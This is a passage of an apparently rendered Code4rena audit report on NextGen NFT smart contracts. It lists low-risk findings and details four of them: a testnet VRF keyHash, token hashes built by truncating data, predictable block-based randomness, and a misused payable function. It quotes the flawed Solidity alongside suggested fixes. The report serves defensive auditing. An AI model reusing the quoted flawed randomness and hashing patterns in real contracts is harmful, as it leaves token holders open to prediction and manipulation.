class=\"mtk12\">mintIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mintingAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ownerOfToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_saltfun_o</span><span class=\"mtk1\">, </span><span class=\"mtk12\">col</span><span class=\"mtk1\">, </span><span class=\"mtk12\">phase</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">364</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk12\">collectionTotalAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">col</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">collectionTotalAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">col</span><span class=\"mtk1\">] + </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>[<a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L233-L238\">233-238</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L266-L271\">266-271</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/MinterContract.sol#L361-L364\">361-364</a>]</p>\n<p><strong><a href=\"https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a?permalink_comment_id=4797585#gistcomment-4797585\">a2rocket (NextGen) confirmed</a></strong></p>\n<p><strong><a href=\"https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a?permalink_comment_id=4797627#gistcomment-4797627\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Important and valid.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this audit, 29 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/747\">report highlighted below</a> by <strong>The_Kakers</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1892\">immeas</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1817\">oakcobalt</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1794\">DeFiHackLabs</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/132\">Tadev</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2036\">cheatc0d3</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1965\">devival</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1940\">r0ck3tz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1761\">Madalad</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1386\">ZanyBonzy</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1332\">dy</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1286\">Arabadzhiev</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1277\">Fulum</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1201\">00xSEV</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1185\">lsaudit</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1136\">audityourcontracts</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1078\">alexfilippov314</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1033\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1008\">rishabh</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/830\">SpicyMeatball</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/743\">MrPotatoMagic</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/712\">xAriextz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/687\">mrudenko</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/588\">pipidu83</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/449\">tpiliposian</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/235\">evmboi32</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/208\">oualidpro</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/178\">ZdravkoHr</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/174\">0x3b</a>.</em></p>\n<h1 id=\"qa-report\" style=\"position:relative;\"><a href=\"#qa-report\" aria-label=\"qa report permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>QA Report</h1>\n<h2 id=\"issue-summary\" style=\"position:relative;\"><a href=\"#issue-summary\" aria-label=\"issue summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Issue Summary</h2>\n<table>\n<thead>\n<tr>\n<th align=\"center\">ID</th>\n<th align=\"left\">Title</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">[01]</td>\n<td align=\"left\"><code>NextGenRandomizerVRF</code> randomizer uses Goerli <code>keyHash</code></td>\n</tr>\n<tr>\n<td align=\"center\">[02]</td>\n<td align=\"left\"><code>fulfillRandomWords</code> sets the token hash as the first fulfilled random number instead of calculating a hash</td>\n</tr>\n<tr>\n<td align=\"center\">[03]</td>\n<td align=\"left\">Insufficient pseudo-randomness is masked under over-complicated implementation</td>\n</tr>\n<tr>\n<td align=\"center\">[04]</td>\n<td align=\"left\"><code>requestRandomWords()</code> is marked as <code>payable</code> in <code>NextGenRandomizerRNG</code> but it canâ€™t be called with <code>value</code></td>\n</tr>\n<tr>\n<td align=\"center\">[05]</td>\n<td align=\"left\"><code>getWord()</code> returns the same word for different ids</td>\n</tr>\n<tr>\n<td align=\"center\">[06]</td>\n<td align=\"left\">Predictable pseudo-random values should be proposed by trusted roles</td>\n</tr>\n<tr>\n<td align=\"center\">[07]</td>\n<td align=\"left\"><code>returnHighestBidder()</code> doesnâ€™t update the <code>highBid</code> attribute on its calculation</td>\n</tr>\n<tr>\n<td align=\"center\">[08]</td>\n<td align=\"left\">Auction participants will have their funds locked until NFT is claimed</td>\n</tr>\n<tr>\n<td align=\"center\">[09]</td>\n<td align=\"left\">Airdropped minted tokens for auctions should be transferred to a escrow contract</td>\n</tr>\n<tr>\n<td align=\"center\">[10]</td>\n<td align=\"left\">The receiver of the funds from <code>claimAuction()</code> should be moved to another function</td>\n</tr>\n<tr>\n<td align=\"center\">[11]</td>\n<td align=\"left\">Use <code>supportsInterface()</code> from EIP-165 instead of custom-made checks</td>\n</tr>\n<tr>\n<td align=\"center\">[12]</td>\n<td align=\"left\"><code>supportsInterface()</code> is incorrectly implemented on <code>NextGenCore</code></td>\n</tr>\n<tr>\n<td align=\"center\">[13]</td>\n<td align=\"left\">Collection scripts with indexes 999 and 1000 canâ€™t be updated</td>\n</tr>\n<tr>\n<td align=\"center\">[14]</td>\n<td align=\"left\">It is not possible to add or remove generative scripts</td>\n</tr>\n<tr>\n<td align=\"center\">[15]</td>\n<td align=\"left\">Merkle nodes can have 64 bytes length, making internal nodes be reinterpreted as leaf values</td>\n</tr>\n<tr>\n<td align=\"center\">[16]</td>\n<td align=\"left\">Merkle proofs from <code>burnOrSwapExternalToMint()</code> could be used in <code>mint()</code> and vice versa</td>\n</tr>\n<tr>\n<td align=\"center\">[17]</td>\n<td align=\"left\">Lack of check for empty artist signature</td>\n</tr>\n<tr>\n<td align=\"center\">[18]</td>\n<td align=\"left\">Artist canâ€™t propose new addresses and percentages</td>\n</tr>\n<tr>\n<td align=\"center\">[19]</td>\n<td align=\"left\"><code>acceptAddressesAndPercentages()</code> can be frontrunned by artists to change settings</td>\n</tr>\n<tr>\n<td align=\"center\">[20]</td>\n<td align=\"left\"><code>acceptAddressesAndPercentages()</code> can approve addresses and percentages that have not been set</td>\n</tr>\n<tr>\n<td align=\"center\">[21]</td>\n<td align=\"left\">Unnecessary address <code>payable</code> conversions</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"01-nextgenrandomizervrf-randomizer-uses-goerli-keyhash\" style=\"position:relative;\"><a href=\"#01-nextgenrandomizervrf-randomizer-uses-goerli-keyhash\" aria-label=\"01 nextgenrandomizervrf randomizer uses goerli keyhash permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[01] <code>NextGenRandomizerVRF</code> randomizer uses Goerli <code>keyHash</code></h2>\n<p>The randomizer will never resolve the words they need to generate the token hash to set for the token id.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>requestRandomWords()</code> requests words with a <code>tokenHash</code> to the <code>VRFCoordinatorV2</code> contract: <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerVRF.sol#L54-L55\">RandomizerVRF.sol#L54-L55</a></p>\n<p>That hash is initialized with its Goerli value:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerVRF.sol#L26\">RandomizerVRF.sol#L26</a></li>\n<li><a href=\"https://docs.chain.link/vrf/v2/subscription/supported-networks#goerli-testnet\">Chainlink Docs</a></li>\n</ul>\n<p>The <code>VRFCoordinatorV2</code> contract ignores invalid hashes:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Note we do not check whether the keyHash is valid to save gas.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The consequence for users is that they can send requests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// for invalid keyHashes which will simply not be fulfilled.</span></span></span></code></pre>\n<p><a href=\"https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/vrf/VRFCoordinatorV2.sol#L386-L388\">VRFCoordinatorV2.sol#L386-L388</a></p>\n<p>This leads to the <code>NextGenRandomizerVRF</code> being unable to resolve the words to set the token hash.</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Define the <code>tokenHash</code> with a variable in the constructor.</p>\n<h2 id=\"02-fulfillrandomwords-sets-the-token-hash-as-the-first-fulfilled-random-number-instead-of-calculating-a-hash\" style=\"position:relative;\"><a href=\"#02-fulfillrandomwords-sets-the-token-hash-as-the-first-fulfilled-random-number-instead-of-calculating-a-hash\" aria-label=\"02 fulfillrandomwords sets the token hash as the first fulfilled random number instead of calculating a hash permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[02] <code>fulfillRandomWords</code> sets the token hash as the first fulfilled random number instead of calculating a hash</h2>\n<p>The sources of entropy for the token hash randomness are greatly reduced.</p>\n<p>The implementation expects to consider multiple words (in case it is configured that way), AND the token id for randomness, but it is <strong>only</strong> using the <strong>first</strong> word.</p>\n<p>This affects both <code>RandomizerRNG</code> and <code>RandomizerVRF</code> contracts.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Notice how <code>fulfillRandomWords()</code> calculates the token hash as <code>bytes32(abi.encodePacked(_randomWords,requestToToken[_requestId]))</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">fulfillRandomWords</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_randomWords</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gencoreContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setTokenHash</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenIdToCollection</span><span class=\"mtk1\">[</span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">]],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-&gt;          </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_randomWords</span><span class=\"mtk1\">,</span><span class=\"mtk12\">requestToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">]))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RequestFulfilled</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_requestId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_randomWords</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerVRF.sol#L66\">RandomizerVRF.sol#L66</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L49\">RandomizerRNG.sol#L49</a></li>\n</ul>\n<p>The problem is that <code>bytes32()</code> is only taking the left-most 32 bytes of the abi encoded data, which correspond in this case to the first word in the <code>_randomWords</code> array.</p>\n<p>Subsequent words (in the case of <code>RandomizerVRF</code>) and the <code>tokenId</code> (<code>requestToToken[_requestId]</code>) will not be considered as a source of entropy for the hash.</p>\n<p>In fact, it will set the token hash with the same value as the first fulfilled word.</p>\n<h3 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Calculate the <code>keccak256</code> hash of the packed data. This way the whole pack will be considered for the hash:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) internal override {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        gencoreContract.setTokenHash(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            tokenIdToCollection[requestToToken[_requestId]],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            requestToToken[_requestId],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-           bytes32(abi.encodePacked(_randomWords,requestToToken[_requestId]))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           bytes32(keccak256(abi.encodePacked(_randomWords,requestToToken[_requestId])))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        emit RequestFulfilled(_requestId, _randomWords);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h2 id=\"03-insufficient-pseudo-randomness-is-masked-under-over-complicated-implementation\" style=\"position:relative;\"><a href=\"#03-insufficient-pseudo-randomness-is-masked-under-over-complicated-implementation\" aria-label=\"03 insufficient pseudo randomness is masked under over complicated implementation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[03] Insufficient pseudo-randomness is masked under over-complicated implementation</h2>\n<p><code>RandomizerNXT</code> attempts to provide pseudo-randomness via <code>randoms.randomNumber()</code> and <code>randoms.randomWord()</code> through the <code>XRandoms</code> contract to create a token hash:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerNXT.sol#L57\">RandomizerNXT.sol#L57</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/XRandoms.sol#L35-L43\">XRandoms.sol#L35-L43</a></li>\n</ul>\n<p>But these functions just provide a false sensation of â€œmoreâ€ randomness:</p>\n<ul>\n<li>Both functions rely on <code>abi.encodePacked(block.prevrandao, blockhash(block.number - 1), block.timestamp)</code> which will always return the same result for the same block.</li>\n<li><code>randomWord()</code> uses <code>getWord()</code> to return a word from a list, but adds no additional value to randomness, as it will always returned a correlated value to its corresponding <code>id</code>, and will only be used to create a hash.</li>\n<li>A subset is returned by the operation <code>% 1000</code> or <code>% 100</code>, which will unnecessarily restrict the values of the random numbers, as they will be used to create a hash.</li>\n</ul>\n<h3 id=\"recommendation-1\" style=\"position:relative;\"><a href=\"#recommendation-1\" aria-label=\"recommendation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Remove the <code>XRandoms</code> contract as it adds unnecessary complexity and provides no additional value to the randomness of the result of <code>calculateTokenHash()</code> in <code>RandomizerNXT</code>.</p>\n<p>In case the random words and numbers are valuable, expose them in some way, as it is currently not possible to retrieve them after the token hash is generated. The same applies to <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/XRandoms.sol#L45-L47\">returnIndex()</a>, which is useless, as there is no stored or emitted data about the <code>id</code> a token used to generate its hash.</p>\n<h2 id=\"04-requestrandomwords-is-marked-as-payable-in-nextgenrandomizerrng-but-it-cant-be-called-with-value\" style=\"position:relative;\"><a href=\"#04-requestrandomwords-is-marked-as-payable-in-nextgenrandomizerrng-but-it-cant-be-called-with-value\" aria-label=\"04 requestrandomwords is marked as payable in nextgenrandomizerrng but it cant be called with value permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[04] <code>requestRandomWords()</code> is marked as <code>payable</code> in <code>NextGenRandomizerRNG</code> but it canâ€™t be called with <code>value</code></h2>\n<p>The function is marked as <code>payable</code> and sends <code>value</code> on it:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L40\">RandomizerRNG.sol#L40</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L42\">RandomizerRNG.sol#L42</a></li>\n</ul>\n<p>It can only be called via <code>calculateTokenHash()</code>, which doesnâ€™t provide it with <code>value</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L56\">RandomizerRNG.sol#L56</a></p>\n<h3 id=\"recommendation-2\" style=\"position:relative;\"><a href=\"#recommendation-2\" aria-label=\"recommendation 2 permalink\" class=\"anchor 